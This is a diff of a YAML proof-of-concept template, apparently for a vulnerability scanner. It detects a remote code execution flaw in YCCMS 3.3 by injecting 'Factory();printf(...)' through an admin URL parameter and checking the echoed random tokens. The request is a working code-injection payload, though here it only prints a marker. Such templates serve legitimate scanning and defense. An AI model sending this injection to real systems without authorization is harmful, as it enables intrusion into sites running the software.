@@ -1,12 +1,13 @@
 name: poc-yaml-yccms33-rce
 set:
   r1: randomLowercase(32)
+  r2: randomLowercase(32)
 rules:
   - method: GET
-    path: /admin/?a=Factory();printf('{{r1}}');//../
+    path: /admin/?a=Factory();printf('{{r1}}%%{{r2}}');//../
     follow_redirects: false
     expression: |
-      status == 200 && body.bcontains(b'{{r1}}')
+      status == 200 && body.bcontains(b'{{r1}}%{{r2}}')
 detail:
   author: j4ckzh0u(https://github.com/j4ckzh0u)
   links:
